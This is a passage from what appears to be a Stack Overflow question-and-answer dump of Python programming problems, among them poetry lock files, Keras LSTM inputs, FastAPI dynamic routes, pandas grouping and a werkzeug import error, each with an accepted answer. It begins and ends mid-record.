        &quot;      112│         if links and not selected_links:&quot;,
        &quot;      113│             raise RuntimeError(&quot;,
        &quot;      114│                 \&quot;Retrieved digest for link {}({}) not in poetry.lock metadata {}\&quot;.format(&quot;,
        &quot;    → 115│                     link.filename, h, hashes&quot;,
        &quot;      116│                 )&quot;,
        &quot;      117│             )&quot;,
        &quot;      118│ &quot;,
        &quot;      119│         return selected_links&quot;
    ]
}
</code></pre>
<p>If you notice, for all 3 packages, the retrieved digest is actually in the list of digests of the metadata section of the poetry lock file.
Our guess is that maybe this lock file was generated by an older version of poetry and is no longer valid. Maybe a hashing method should be mentioned (for example the retrieved digest is sha256, but no method is specified on the ones that are compared with it)?
Another curious thing is that poetry is not installed inside the dockerfile, but seems to reach that point, nevetheless, and I'm really curious how this can happen.</p>
<p>Any insight would be greatly appreciated (and any link with more information, even)!</p>
<p>Thanks a lot for your time!  (Feel free to ask for more information if this seems inadequate to you!)</p>
<p>Cheers!</p>
","72980882","<p>When I've had this issue myself it has been fixed by recreating the lock file using a newer version of poetry. If you are able to view the .toml file I suggest deleting this lock file and then running <code>poetry install</code> to create a new lock file.</p>
"
"72831076","1","How can I use a sequence of numbers to predict a single number in Tensorflow?","<p>I am trying to build a machine learning model which predicts a single number from a series of numbers. I am using a Sequential model from the keras API of Tensorflow.</p>
<p>You can imagine my dataset to look something like this:</p>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th>Index</th>
<th>x data</th>
<th>y data</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td><code>np.ndarray(shape (1209278,) )</code></td>
<td><code>numpy.float32</code></td>
</tr>
<tr>
<td>1</td>
<td><code>np.ndarray(shape (1211140,) )</code></td>
<td><code>numpy.float32</code></td>
</tr>
<tr>
<td>2</td>
<td><code>np.ndarray(shape (1418411,) )</code></td>
<td><code>numpy.float32</code></td>
</tr>
<tr>
<td>3</td>
<td><code>np.ndarray(shape (1077132,) )</code></td>
<td><code>numpy.float32</code></td>
</tr>
<tr>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
</div>
<p><strong>This was my first attempt:</strong></p>
<p>I tried using a numpy ndarray which contains numpy ndarrays which finally contain floats as my xdata, so something like this:</p>
<pre class=""lang-py prettyprint-override""><code>array([
    array([3.59280851, 3.60459062, 3.60459062, ..., 4.02911493])
    array([3.54752101, 3.56740332, 3.56740332, ..., 4.02837855])
    array([3.61048168, 3.62152741, 3.62152741, ..., 4.02764217])
])
</code></pre>
<p>My y data is a numpy ndarray containing floats, which looks something like this</p>
<pre class=""lang-py prettyprint-override""><code>array([2.9864411, 3.0562437, ... , 2.7750807, 2.8712902], dtype=float32)
</code></pre>
<p>But when I tried to train the model using <code>model.fit()</code> it yields this error:</p>
<pre><code>ValueError: Failed to convert a NumPy array to a Tensor (Unsupported object type numpy.ndarray).
</code></pre>
<p>I was able to solve this error by asking a question related to this:
<a href=""https://stackoverflow.com/questions/72815591/how-can-i-have-a-series-of-numpy-ndarrays-as-the-input-data-to-train-a-tensorflo"">How can I have a series of numpy ndarrays as the input data to train a tensorflow machine learning model?</a></p>
<p><strong>My latest attempt:</strong>
Because Tensorflow does not seem to be able to convert a ndarray of ndarrays to a tensor, I tried to convert my x data to a list of ndarrays like this:</p>
<pre class=""lang-py prettyprint-override""><code>[
    array([3.59280851, 3.60459062, 3.60459062, ..., 4.02911493])
    array([3.54752101, 3.56740332, 3.56740332, ..., 4.02837855])
    array([3.61048168, 3.62152741, 3.62152741, ..., 4.02764217])
]
</code></pre>
<p>I left my y data untouched, so as a ndarray of floats.
Sadly my attempt of using a list of ndarrays instead of a ndarray of ndarrays yielded this error:</p>
<pre class=""lang-py prettyprint-override""><code>ValueError: Data cardinality is ambiguous:
  x sizes: 1304593, 1209278, 1407624, ...
  y sizes: 46
Make sure all arrays contain the same number of samples.
</code></pre>
<p>As you can see, my x data consists of arrays which all have a different shape.
But I don't think that this should be a problem.</p>
<p><strong>Question:</strong></p>
<p>My guess is that Tensorflow tries to use my list of arrays as <em>multiple</em> inputs.
<a href=""https://www.tensorflow.org/api_docs/python/tf/keras/Model#fit"" rel=""nofollow noreferrer"">Tensorflow fit() documentation</a></p>
<p>But I don't want to use my x data as multiple inputs.
Easily said I just want my model to predict a number from a sequence of numbers.
For example like this:</p>
<ul>
<li>array([3.59280851, 3.60459062, 3.60459062, ...]) =&gt; 2.8989773</li>
<li>array([3.54752101, 3.56740332, 3.56740332, ...]) =&gt; 3.0893357</li>
<li>...</li>
</ul>
<p><strong>How can I use a sequence of numbers to predict a single number in Tensorflow?</strong></p>
<p><strong>EDIT</strong>
Maybe I should have added that I want to use a RNN, especially a LSTM.
I have had a look at the Keras documentation, and in their simplest example they are using a <code>Embedding</code> layer. But I don't really know what to do.</p>
<p>All in all I think that my question ist pretty general and should be easy to answer if you know how to tackle this problem, unlike me.
Thanks in advance!</p>
","72869570","<p>Try something like this:</p>
<pre><code>import numpy as np
import tensorflow as tf

# add additional dimension for lstm layer
x_train = np.asarray(train_set[&quot;x data&quot;].values))[..., None] 
y_train = np.asarray(train_set[&quot;y data&quot;]).astype(np.float32)

model = tf.keras.Sequential()
model.add(tf.keras.layers.LSTM(units=32))
model.add(tf.keras.layers.Dense(units=1))
model.compile(loss=&quot;mean_squared_error&quot;, optimizer=&quot;adam&quot;, metrics=&quot;mse&quot;)
model.fit(x=x_train,y=y_train,epochs=10)
</code></pre>
<p>Or with a ragged input for different sequence lengths:</p>
<pre><code>x_train = tf.ragged.constant(train_set[&quot;x data&quot;].values[..., None]) # add additional dimension for lstm layer
y_train = np.asarray(train_set[&quot;y data&quot;]).astype(np.float32)

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=[None, x_train.bounding_shape()[-1]], batch_size=2, dtype=tf.float32, ragged=True))
model.add(tf.keras.layers.LSTM(units=32))
model.add(tf.keras.layers.Dense(units=1))
model.compile(loss=&quot;mean_squared_error&quot;, optimizer=&quot;adam&quot;, metrics=&quot;mse&quot;)
model.fit(x=x_train,y=y_train,epochs=10)
</code></pre>
<p>Or:</p>
<pre><code>x_train = tf.ragged.constant([np.array(list(v))[..., None] for v in train_set[&quot;x data&quot;].values]) # add additional dimension for lstm layer
</code></pre>
"
"73365780","1","Why is not recommended to install poetry with homebrew?","<p>Poetry official documentation <a href=""https://python-poetry.org/docs/master/#installing-with-the-official-installer"" rel=""noreferrer"">strictly recommends sticking with the official installer</a>. However, <a href=""https://formulae.brew.sh/formula/poetry"" rel=""noreferrer"">homebrew has poetry formulae</a>.</p>
<pre><code>brew install poetry
</code></pre>
<p>Usually, I like to keep everything I can in homebrew to manage installations easily.</p>
<p><strong>What is the drawback and risks of installing poetry using homebrew instead of the recommended installation script?</strong></p>
","73365831","<p>The drawback is that <code>poetry</code> will be unable to upgrade itself (I've no idea what'd actually happen), and you'll not be able to install specific poetry versions. Homebrew installed poetry will probably also depend on Homebrew-installed Python, etc, instead of having its own isolated <code>venv</code> to execute from.</p>
<p>If you use homebrew to install poetry, don't try to manage that installation any way outside of homebrew. Otherwise, it's probably fine.</p>
"
"73049456","1","Apply the nested shape of one list on another flat list","<p>I have two lists:</p>
<p>A: <code>[[0, 1], [2, [3]], 4]</code></p>
<p>B: <code>[5, 6, 7, 8, 9]</code></p>
<p>I wish list B could have the same shape with list A:
<code>[5, 6, 7, 8, 9]</code> =&gt; <code>[[5, 6], [7, [8]], 9]</code></p>
<p>So list A and list B have the same dimension/shape:</p>
<p>A: <code>[[0, 1], [2, [3]], 4]</code></p>
<p>B: <code>[[5, 6], [7, [8]], 9]</code></p>
<p>Consider about time complexity, I hope there is a way of O(n) if possible.</p>
","73049537","<p>Assuming the number of items is identical, you could use a recursive function and an iterator:</p>
<pre><code>A = [[0, 1], [2, [3]], 4]
B = [5, 6, 7, 8, 9]

def copy_shape(l, other):
    if isinstance(other, list):
        other = iter(other)
    if isinstance(l, list):
        return [copy_shape(x, other) for x in l]
    else:
        return next(other)
    
out = copy_shape(A, B)
</code></pre>
<p>output: <code>[[5, 6], [7, [8]], 9]</code></p>
<p><em>NB. the complexity is O(n). You can also use <code>if hasattr(other, '__len__')</code> or <code>if not hasattr(other, '__next__')</code> in place of <code>if isinstance(other, list)</code> to generalize to other iterables (except iterator).</em></p>
"
"70783994","1","Reload routes in FastAPI during runtime","<p>I have a FastAPI app in which routes are dynamically generated based on an DB config.</p>
<p>However, once the routes are defined and the app running, if the config changes, there seems to be no way to reload the config so that the routes could reflect the config.
The only solution I have for now is manually restart the asgi app by restarting uvicorn.</p>
<p>Is there any way to fully regenerate routes without stopping the app, that could ideally be called from an URL ?</p>
","74035526","<p>It is possible to modify routes at runtime.</p>
<p><code>FastAPI</code> apps have the method <code>add_api_route</code> which allows you to dynamically define new endpoints. To remove an endpoint you will need to fiddle directly with the routes of the underlying <code>Router</code>.</p>
<p>The following code shows how to dynamically add and remove routes.</p>
<pre class=""lang-py prettyprint-override""><code>import fastapi

app = fastapi.FastAPI()


@app.get(&quot;/add&quot;)
async def add(name: str):
    async def dynamic_controller():
        return f&quot;dynamic: {name}&quot;
    app.add_api_route(f&quot;/dyn/{name}&quot;, dynamic_controller, methods=[&quot;GET&quot;])
    return &quot;ok&quot;


def route_matches(route, name):
    return route.path_format == f&quot;/dyn/{name}&quot;


@app.get(&quot;/remove&quot;)
async def remove(name: str):
    for i, r in enumerate(app.router.routes):
        if route_matches(r, name):
            del app.router.routes[i]
            return &quot;ok&quot;
    return &quot;not found&quot;
</code></pre>
<p>And below is shown how to use it</p>
<pre><code>$ curl 127.0.0.1:8000/dyn/test
{&quot;detail&quot;:&quot;Not Found&quot;}
$ curl 127.0.0.1:8000/add?name=test
&quot;ok&quot;
$ curl 127.0.0.1:8000/dyn/test
&quot;dynamic: test&quot;
$ curl 127.0.0.1:8000/add?name=test2
&quot;ok&quot;
$ curl 127.0.0.1:8000/dyn/test2
&quot;dynamic: test2&quot;
$ curl 127.0.0.1:8000/remove?name=test
&quot;ok&quot;
$ curl 127.0.0.1:8000/dyn/test
{&quot;detail&quot;:&quot;Not Found&quot;}
$ curl 127.0.0.1:8000/dyn/test2
&quot;dynamic: test2&quot;
</code></pre>
<p>Note though, that if you change the routes dynamically you will need to invalidate the cache of the OpenAPI endpoint.</p>
"
"74097901","1","meaning of `__all__` inside Python class","<p>I am aware of the use of <code>__all__</code> at module scope. However I came across the usage of <code>__all__</code> inside classes. This is done e.g. in the <a href=""https://github.com/python/cpython/blob/1863302d61a7a5dd8b8d345a00f0ee242c7c10bf/Lib/typing.py#L3328-L3333"" rel=""noreferrer"">Python standardlib</a>:</p>
<pre class=""lang-py prettyprint-override""><code>class re(metaclass=_DeprecatedType):
    &quot;&quot;&quot;Wrapper namespace for re type aliases.&quot;&quot;&quot;

    __all__ = ['Pattern', 'Match']
    Pattern = Pattern
    Match = Match
</code></pre>
<p>What does <code>__all__</code> achieve in this context?</p>
","74098046","<p>The <code>typing</code> module does some unorthodox things to patch existing modules (like <code>re</code>). Basically, the built-in module <code>re</code> is being replaced with this class <code>re</code> defined using a custom metaclass that intercepts attribute lookups on the underlying object. <code>__all__</code> doesn't really have any special meaning to the <em>class</em> (it's just another class attribute), but it effectively becomes the <code>__all__</code> attribute of the <code>re</code> module. It's the metaclass's definition of <code>__getattribute__</code> that accomplishes this.</p>
"
"73056540","1","No module named amazon_linux_extras when running amazon-linux-extras install epel -y","<p>Here is my (simplified) Dockerfile</p>
<pre><code># https://docs.aws.amazon.com/lambda/latest/dg/images-create.html#images-create-from-base
FROM public.ecr.aws/lambda/python:3.8

# get the amazon linux extras
RUN yum install -y amazon-linux-extras

RUN amazon-linux-extras install epel -y
</code></pre>
<p>When it reaches the <code>RUN amazon-linux-extras install epel -y</code> line during the build, it gets</p>
<pre><code>Step 6/8 : RUN amazon-linux-extras install epel -y
 ---&gt; Running in dbb44f57111a
/var/lang/bin/python: No module named amazon_linux_extras
The command '/bin/sh -c amazon-linux-extras install epel -y' returned a non-zero code: 1
</code></pre>
<p>I think that has to do with some python 2 vs. 3 stuff, but I'm not sure</p>
","73056713","<p>You're correct, it's because <code>amazon-linux-extras</code> only works with Python 2. You can modify the <code>RUN</code> instruction to <code>RUN PYTHON=python2 amazon-linux-extras install epel -y</code></p>
"
"72893180","1","Flask-Restful Error: request Content-Type was not 'application/json'.""}","<p>I was following <a href=""https://www.youtube.com/watch?v=GMppyAPbLYk&amp;t=202s"" rel=""nofollow noreferrer"">this tutorial</a> and it was going pretty well. He then introduced <code>reqparse</code> and I followed along. I tried to test my code and I get this error
<code>{'message': &quot;Did not attempt to load JSON data because the request Content-Type was not 'application/json'.&quot;}</code></p>
<p>I don't know if I'm missing something super obvious but I'm pretty sure I copied his code exactly. here's the code:
<code>main.py</code></p>
<pre class=""lang-py prettyprint-override""><code>from flask import Flask, request
from flask_restful import Api, Resource, reqparse

app = Flask(__name__)
api = Api(app)

#basic get and post
names = {&quot;sai&quot;: {&quot;age&quot;: 19, &quot;gender&quot;: &quot;male&quot;},
            &quot;bill&quot;: {&quot;age&quot;: 23, &quot;gender&quot;: &quot;male&quot;}}
class HelloWorld(Resource):
    def get(self, name, numb):
        return names[name]

    def post(self):
        return {&quot;data&quot;: &quot;Posted&quot;}

api.add_resource(HelloWorld, &quot;/helloworld/&lt;string:name&gt;/&lt;int:numb&gt;&quot;)

# getting larger data
pictures = {}
class picture(Resource):
    def get(self, picture_id):
        return pictures[picture_id]

    def put(self, picture_id):
        print(request.form['likes'])
        pass

api.add_resource(picture, &quot;/picture/&lt;int:picture_id&gt;&quot;)

# reqparse
video_put_args = reqparse.RequestParser() # make new request parser object to make sure it fits the correct guidelines
video_put_args.add_argument(&quot;name&quot;, type=str, help=&quot;Name of the video&quot;)
video_put_args.add_argument(&quot;views&quot;, type=int, help=&quot;Views on the video&quot;)
video_put_args.add_argument(&quot;likes&quot;, type=int, help=&quot;Likes on the video&quot;)

videos = {}

class Video(Resource):
    def get(self, video_id):
        return videos[video_id]

    def post(self, video_id):
        args = video_put_args.parse_args()
        print(request.form['likes'])
        return {video_id: args}

api.add_resource(Video, &quot;/video/&lt;int:video_id&gt;&quot;)

if __name__ == &quot;__main__&quot;:
    app.run(debug=True)
</code></pre>
<p>test_rest.py</p>
<pre class=""lang-py prettyprint-override""><code>import requests

BASE = &quot;http://127.0.0.1:5000/&quot;

response = requests.post(BASE + 'video/1', {&quot;likes&quot;: 10})

print(response.json())
</code></pre>
","72893595","<p>I don't know why you have an issue as far as I can tell you did copy him exactly how he did it. Here's a fix that'll work although I can't explain why his code works and yours doesn't. His video is two years old so it could be deprecated behaviour.</p>
<pre class=""lang-py prettyprint-override""><code>import requests
import json

BASE = &quot;http://127.0.0.1:5000/&quot;

payload = {&quot;likes&quot;: 10}

headers = {'accept': 'application/json'}
response = requests.post(BASE + 'video/1', json=payload)

print(response.json())
</code></pre>
"
"72956054","1","Zip like function that iterates over multiple items in lists and returns possibilities","<p>In the following code:</p>
<pre><code>a = [[&quot;2022&quot;], [&quot;2023&quot;]]
b = [[&quot;blue&quot;, &quot;red&quot;], [&quot;green&quot;, &quot;yellow&quot;]]
c = [[&quot;1&quot;, &quot;2&quot;, &quot;3&quot;], [&quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;], [&quot;8&quot;, &quot;9&quot;, &quot;10&quot;, &quot;11&quot;], [&quot;12&quot;, &quot;13&quot;]]
</code></pre>
<p>I would like a function that outputs this, but for any number of variables:</p>
<pre><code>[
    [&quot;2022&quot;, &quot;blue&quot;, &quot;1&quot;],
    [&quot;2022&quot;, &quot;blue&quot;, &quot;2&quot;],
    [&quot;2022&quot;, &quot;blue&quot;, &quot;3&quot;],
    [&quot;2022&quot;, &quot;red&quot;, &quot;4&quot;],
    [&quot;2022&quot;, &quot;red&quot;, &quot;5&quot;],
    [&quot;2022&quot;, &quot;red&quot;, &quot;6&quot;],
    [&quot;2022&quot;, &quot;red&quot;, &quot;7&quot;],
    [&quot;2023&quot;, &quot;green&quot;, &quot;8&quot;],
    [&quot;2023&quot;, &quot;green&quot;, &quot;9&quot;],
    [&quot;2023&quot;, &quot;green&quot;, &quot;10&quot;],
    [&quot;2023&quot;, &quot;green&quot;, &quot;11&quot;],
    [&quot;2023&quot;, &quot;yellow&quot;, &quot;12&quot;],
    [&quot;2023&quot;, &quot;yellow&quot;, &quot;13&quot;],
]
</code></pre>
<p>I have searched for a function to do this with itertools or zip, but haven't found anything yet.</p>
<p>To clarify, my use case for this was to iterate through values of a nested/multi-level dropdown menu (the first dropdown returns options, and each option returns a different dropdown, and so on).</p>
","72956257","<p>First, you join the first argument, to a list of lists with only one element each.</p>
<p>Then for each <code>sublist</code> and its index <code>i</code> in the next argument, you pick the i-th list of the previous iteration <code>res[i]</code> and add to <code>aux</code> len(sublist) lists each of one is the <code>res[i]</code> with one item from <code>sublist</code>.</p>
<pre class=""lang-py prettyprint-override""><code>from itertools import chain

def f(*args):
    res = list(chain.from_iterable([[item] for item in l] for l in args[0]))
    for arg in args[1:]:
        aux = []
        for i, sublist in enumerate(arg):
            aux += [res[i] + [opt] for opt in sublist]
        res = aux
    return res
</code></pre>
<p>In addition if you want to verify that the arguments passed to the function are correct, you can use this:</p>
<pre class=""lang-py prettyprint-override""><code>def check(*args):
    size = sum(len(l) for l in args[0])
    for arg in args[1:]:
        if len(arg) != size:
            return False
        size = sum(len(l) for l in arg)
    return True
</code></pre>
"
"73436440","1","Replace and merge rows in pandas according to condition","<p>I have a dataframe:</p>
<pre><code>   lft rel rgt num
0   t3  r3  z2  3
1   t1  r3  x1  9
2   x2  r3  t2  8
3   x4  r1  t2  4
4   t1  r1  z3  1
5   x1  r1  t2  2
6   x2  r2  t4  4
7   z3  r2  t4  5
8   t4  r3  x3  4
9   z1  r2  t3  4
</code></pre>
<p>And a reference dictionary:</p>
<pre><code>replacement_dict = {
    'X1' : ['x1', 'x2', 'x3', 'x4'],
    'Y1' : ['y1', 'y2'],
    'Z1' : ['z1', 'z2', 'z3']
}
</code></pre>
<p>My goal is to replace all occurrences of <code>replacement_dict['X1']</code> with 'X1', and then merge the rows together. For example, any instance of 'x1', 'x2', 'x3' or 'x4' will be replaced by 'X1', etc.</p>
<p>I can do this by selecting the rows that contain any of these strings and replacing them with 'X1':</p>
<pre><code>keys = replacement_dict.keys()
for key in keys:
    DF.loc[DF['lft'].isin(replacement_dict[key]), 'lft'] = key
    DF.loc[DF['rgt'].isin(replacement_dict[key]), 'rgt'] = key
</code></pre>
<p>giving:</p>
<pre><code>    lft rel rgt num
0   t3  r3  Z1  3
1   t1  r3  X1  9
2   X1  r3  t2  8
3   X1  r1  t2  4
4   t1  r1  Z1  1
5   X1  r1  t2  2
6   X1  r2  t4  4
7   Z1  r2  t4  5
8   t4  r3  X1  4
9   Z1  r2  t3  4
</code></pre>
<p>Now, if I select all the rows containing 'X1' and merge them, I should end up with:</p>
<pre><code>    lft rel rgt num
0   X1  r3  t2  8
1   X1  r1  t2  6
2   X1  r2  t4  4
3   t1  r3  X1  9
4   t4  r3  X1  4
</code></pre>
<p>So the three columns ['lft', 'rel', 'rgt'] are unique while the 'num' column is added up for each of these rows. The row 1 above : ['X1'  'r1'  't2'  6] is the sum of two rows ['X1'  'r1'  't2'  4] and ['X1'  'r1'  't2'  2].</p>
<p>I can do this easily for a small number of rows, but I am working with a dataframe with 6 million rows and a replacement dictionary with 60,000 keys. This is taking forever using a simple row wise extraction and replacement.</p>
<p>How can this (specifically the last part) be scaled efficiently? Is there a pandas trick that someone can recommend?</p>
","73436639","<p>Reverse the <code>replacement_dict</code> mapping and <code>map()</code> this new mapping to each of lft and rgt columns to substitute certain values (e.g. x1-&gt;X1, y2-&gt;Y1 etc.). As some values in lft and rgt columns don't exist in the mapping (e.g. t1, t2 etc.), call <code>fillna()</code> to fill in these values.<sup>1</sup></p>
<p>You may also <code>stack()</code> the columns whose values need to be replaced (lft and rgt), call map+fillna and <code>unstack()</code> back but because there are only 2 columns, it may not be worth the trouble for this particular case.</p>
<p>The second part of the question may be answered by summing num values after grouping by lft, rel and rgt columns; so <code>groupby().sum()</code> should do the trick.</p>
<pre class=""lang-py prettyprint-override""><code># reverse replacement map
reverse_map = {v : k for k, li in replacement_dict.items() for v in li}

# substitute values in lft column using reverse_map
df['lft'] = df['lft'].map(reverse_map).fillna(df['lft'])
# substitute values in rgt column using reverse_map
df['rgt'] = df['rgt'].map(reverse_map).fillna(df['rgt'])

# sum values in num column by groups
result = df.groupby(['lft', 'rel', 'rgt'], as_index=False)['num'].sum()
</code></pre>
<p><sup>1</sup>: <code>map()</code> + <code>fillna()</code> may perform better for your use case than <code>replace()</code> because under the hood, <code>map()</code> implements a Cython optimized <code>take_nd()</code> method that performs particularly well if there are a lot of values to replace, while <code>replace()</code> implements <code>replace_list()</code> method which uses a Python loop. So if <code>replacement_dict</code> is particularly large (which it is in your case), the difference in performance will be huge, but if <code>replacement_dict</code> is small, <code>replace()</code> may outperform <code>map()</code>.</p>
"
"74202814","1","In python, create index from flat representation of nested structure in a list, sorting by alphabetical order","<p>I have lists where each entry is representing a nested structure, where <code>/</code> represents each level in the structure.</p>
<pre><code>['a','a/b/a','a/b','a/b/d',....]
</code></pre>
<p>I want to take such a list and return an index list where each level is sorted in alphabetical order.</p>
<p>If we had the following list</p>
<pre><code>['a','a/b','a/b/a','a/c','a/c/a','b']
</code></pre>
<p>It represents the nested structure</p>
<pre><code>'a':                   #1

    'b':               #1.1
         'a': ...      #1.1.1
    'c':               #1.2
         'a': ...      #1.2.1
'b' : ...              #2
</code></pre>
<p>I am trying to get the output</p>
<pre><code> ['1','1.1','1.1.1', '1.2','1.2.1','2']
</code></pre>
<p>But I am having real issue on how to tackle the problem, would it be solved recursively? Or what would be a way to solve this for any generic list where each level is separated by <code>/</code>? The list is originally not necessarily sorted, and each level can be any generic word.</p>
","74204355","<p>Since the goal is to simply convert the paths to indices according to their respective positions against other paths of the same prefix, there is no need to build a tree at all. Instead, iterate over the paths in alphabetical order while using a dict of sets to keep track of the prefixes at each level of paths, and join the lengths of sets at each level for output:</p>
<pre><code>def indices(paths):
    output = {}
    names = {}
    for index, path in sorted(enumerate(paths), key=lambda t: t[1]):
        counts = []
        prefixes = tuple(path.split('/'))
        for level, name in enumerate(prefixes):
            prefix = prefixes[:level]
            names.setdefault(prefix, set()).add(name)
            counts.append(len(names[prefix]))
        output[index] = '.'.join(map(str, counts))
    return list(map(output.get, range(len(output))))
</code></pre>
<p>so that:</p>
<pre><code>print(indices(['a', 'a/b', 'a/b/a', 'a/c', 'a/c/a', 'b']))
print(indices(['a', 'c', 'b', 'a/b']))
print(indices(['a/b/c/d', 'a/b/d', 'a/b/c']))
print(indices(['abc/d', 'bcc/d']))
print(indices(['apple/cat','apple/dog', 'banana/dog']))
</code></pre>
<p>outputs:</p>
<pre><code>['1', '1.1', '1.1.1', '1.2', '1.2.1', '2']
['1', '3', '2', '1.1']
['1.1.1.1', '1.1.2', '1.1.1']
['1.1', '2.1']
['1.1', '1.2', '2.1']
</code></pre>
<p>Demo: <a href=""https://replit.com/@blhsing/StainedMassivePi"" rel=""nofollow noreferrer"">https://replit.com/@blhsing/StainedMassivePi</a></p>
"
"73105877","1","ImportError: cannot import name 'parse_rule' from 'werkzeug.routing'","<p>I got the following message after running my Flask project on another system.
The application ran all the time without problems:</p>
<pre><code>Error: While importing 'app', an ImportError was raised:

Traceback (most recent call last):
  File &quot;c:\users\User\appdata\local\programs\python\python39\lib\site-packages\flask\cli.py&quot;, line 214, in locate_app
    __import__(module_name)
  File &quot;C:\Users\User\Desktop\Projekt\app\__init__.py&quot;, line 3, in &lt;module&gt;
    from flask_restx import Namespace, Api
  File &quot;c:\users\User\appdata\local\programs\python\python39\lib\site-packages\flask_restx\__init__.py&quot;, line 5, in &lt;module&gt;
  File &quot;c:\users\User\appdata\local\programs\python\python39\lib\site-packages\flask_restx\api.py&quot;, line 50, in &lt;module&gt;
    from .swagger import Swagger
  File &quot;c:\users\User\appdata\local\programs\python\python39\lib\site-packages\flask_restx\swagger.py&quot;, line 18, in &lt;module&gt;
    from werkzeug.routing import parse_rule
ImportError: cannot import name 'parse_rule' from 'werkzeug.routing' (c:\users\User\appdata\local\programs\python\python39\lib\site-packages\werkzeug\routing\__i
nit__.py)
</code></pre>
<p>My requirements.txt</p>
<pre><code>Flask~=2.1.2
psycopg2-binary==2.9.3
Flask-SQLAlchemy==2.5.1
flask-restx==0.5.1
qrcode~=7.3.1
PyPDF2==2.6.0
reportlab~=3.6.10
WTForms~=3.0.1
flask-bootstrap==3.3.7.1
flask-wtf==1.0.1
</code></pre>
","73105878","<p>The workaround I use for now is to pin werkzeug to 2.1.2 in <code>requirements.txt</code>. This should only be done until the other libraries are compatible with the latest version of Werkzeug, at which point the pin should be updated.</p>
<pre><code>werkzeug==2.1.2
</code></pre>
"
"71915309","1","Token used too early error thrown by firebase_admin auth's verify_id_token method","<p>Whenever I run</p>
<pre><code>from firebase_admin import auth
auth.verify_id_token(firebase_auth_token)
</code></pre>
<p>It throws the following error:</p>
<pre><code>Token used too early, 1650302066 &lt; 1650302067. Check that your computer's clock is set correctly.
</code></pre>
<p>I'm aware that the underlying google auth APIs do check the time of the token, however as outlined  <a href=""https://github.com/googleapis/google-auth-library-python/issues/889"" rel=""noreferrer"">here</a> there should be a 10 second clock skew. Apparently, my server time is off by 1 second, however running this still fails even though this is well below the allowed 10 second skew. Is there a way to fix this?</p>
","72977610","<p>This is how the firebase_admin.verify_id_token verifies the token:</p>
<pre><code>verified_claims = google.oauth2.id_token.verify_token(
                    token,
                    request=request,
                    audience=self.project_id,
                    certs_url=self.cert_url)
</code></pre>
<p>and this is the definition of google.oauth2.id_token.verify_token(...)</p>
<pre><code>def verify_token(
    id_token,
    request,
    audience=None,
    certs_url=_GOOGLE_OAUTH2_CERTS_URL,
    clock_skew_in_seconds=0,
):
</code></pre>
<p>As you can see, the function verify_token allows to specify a &quot;clock_skew_in_seconds&quot; but the firebase_admin function is not passing it along, thus the the default of 0 is used and since your server clock is off by 1 second, the check in verify_token fails.</p>
<p>I would consider this a bug in firebase_admin.verify_id_token and maybe you can open an issue against the firebase admin SDK, but other than that you can only make sure, your clock is either exact or shows a time EARLIER than the actual time</p>
<p>Edit:</p>
<p>I actually opened an <a href=""https://github.com/firebase/firebase-admin-python/issues/624"" rel=""noreferrer"">issue on GitHub for firebase/firebase-admin-Python</a> and created an according <a href=""https://github.com/firebase/firebase-admin-python/pull/625"" rel=""noreferrer"">pull request</a> since I looked at all the source files already anyway...</p>
<p>If and when the pull request is merged, the server's clock is allowed to be off by up to a minute.</p>
"
"73134521","1","How to train on a tensorflow_datasets dataset","<p>I'm playing around with tensorflow to become a bit more familiar with the overall workflow. To do this I thought I should start with creating a simple classifier for the well known Iris dataset.</p>
<p>I load the dataset using:</p>
<pre><code>ds = tfds.load('iris', split='train', shuffle_files=True, as_supervised=True)
</code></pre>
<p>I use the following classifier:</p>
<pre class=""lang-py prettyprint-override""><code>model = keras.Sequential([
    keras.layers.Dense(10,activation=&quot;relu&quot;),
    keras.layers.Dense(10,activation=&quot;relu&quot;),
    keras.layers.Dense(3, activation=&quot;softmax&quot;)
])

model.compile(
    optimizer=tf.keras.optimizers.Adam(0.001),
    loss=tf.keras.losses.SparseCategoricalCrossentropy(),
    metrics=[tf.keras.metrics.SparseCategoricalAccuracy()],
)
</code></pre>
<p>I then try to fit the model using:</p>
<pre class=""lang-py prettyprint-override""><code>model.fit(ds,batch_size=50, epochs=100)
</code></pre>
<p>This gives the following error:</p>
<pre><code>Input 0 of layer &quot;dense&quot; is incompatible with the layer: expected min_ndim=2, found ndim=1. Full shape received: (4,)

    Call arguments received by layer &quot;sequential&quot; (type Sequential):
      • inputs=tf.Tensor(shape=(4,), dtype=float32)
      • training=True
      • mask=None
</code></pre>
<p>I also tried defining the model using the functional API(as this was my orignal goal to learn)</p>
<pre class=""lang-py prettyprint-override""><code>inputs = keras.Input(shape=(4,), name='features')

first_hidden = keras.layers.Dense(10, activation='relu')(inputs)
second_hidden = keras.layers.Dense(10, activation=&quot;relu&quot;)(first_hidden)

outputs = keras.layers.Dense(3, activation='softmax')(second_hidden)

model = keras.Model(inputs=inputs, outputs=outputs, name=&quot;test_iris_classification&quot;)
</code></pre>
<p>I now get the same error as before but this time with a warning:</p>
<pre><code>WARNING:tensorflow:Model was constructed with shape (None, 4) for input KerasTensor(type_spec=TensorSpec(shape=(None, 4), dtype=tf.float32, name='features'), name='features', description=&quot;created by layer 'features'&quot;), but it was called on an input with incompatible shape (4,).
</code></pre>
<p>I suspect this is something quite fundamental that haven't understood but I have not been able to figure it out, despite several hours of googling.</p>
<p>PS:
I also tried to download the whole dataset from the <a href=""https://archive.ics.uci.edu/ml/datasets/iris"" rel=""noreferrer"">UCI Machine Learning Repository</a> as a CSV file.</p>
<p>I read it in like this:</p>
<pre><code>ds = pd.read_csv(&quot;iris.data&quot;, header=None)
labels = []
for name in ds[4]:
    if name == &quot;Iris-setosa&quot;:
        labels.append(0)
    elif name == &quot;Iris-versicolor&quot;:
        labels.append(1)
    elif name == &quot;Iris-virginica&quot;:
        labels.append(2)
    else:
        raise ValueError(f&quot;Name wrong name: {name}&quot;)
labels = np.array(labels)
features = np.array(ds[[0,1,2,3]])
</code></pre>
<p>And fit it like this:</p>
<pre><code>model.fit(features, labels,batch_size=50, epochs=100)
</code></pre>
<p>And I'm able to fit the model to this dataset without any problems for both the sequential and the functional API. Which makes me suspect my misunderstanding has something to do with how the tensorflow_datasets works.</p>
","73134765","<p>Set the batch size when loading your data:</p>
<pre><code>import tensorflow_datasets as tfds
import tensorflow as tf

